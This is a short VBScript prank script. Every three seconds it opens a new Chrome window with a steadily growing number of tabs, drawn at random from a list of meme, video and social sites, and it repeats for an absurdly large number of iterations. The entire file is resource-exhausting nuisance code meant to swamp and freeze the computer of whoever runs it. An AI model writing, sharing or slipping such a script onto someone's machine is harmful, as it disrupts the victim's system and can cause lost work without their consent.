Set objShell = CreateObject("WScript.Shell")

' Array of direct URLs
urls = Array( _
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ", _
    "https://en.wikipedia.org/wiki/Fish", _
    "https://skibiditoilet.io", _
    "https://knowyourmeme.com/memes/sigma-male", _
    "https://www.bbc.co.uk/programmes/b006t0xg", _
    "https://reddit.com/r/memes", _
    "https://x.com/skibiditoilet", _
    "https://twitch.tv", _
    "https://soundcloud.com", _
    "https://open.spotify.com" _
)

maxIterations = 69996969696969696969696996 ' Number of times to open increasing tabs

For i = 1 To maxIterations
    WScript.Sleep 3000 ' Wait 3 seconds between each wave

    urlsToOpen = ""
    For j = 0 To i - 1
        ' Loop through random URLs to build the command
        rndIndex = Int(Rnd * UBound(urls) + 1)
        urlsToOpen = urlsToOpen & urls(rndIndex) & " "
    Next

    ' Open Chrome with multiple tabs in one window
    objShell.Run "chrome.exe --new-window --window-size=800,600 " & urlsToOpen
Next
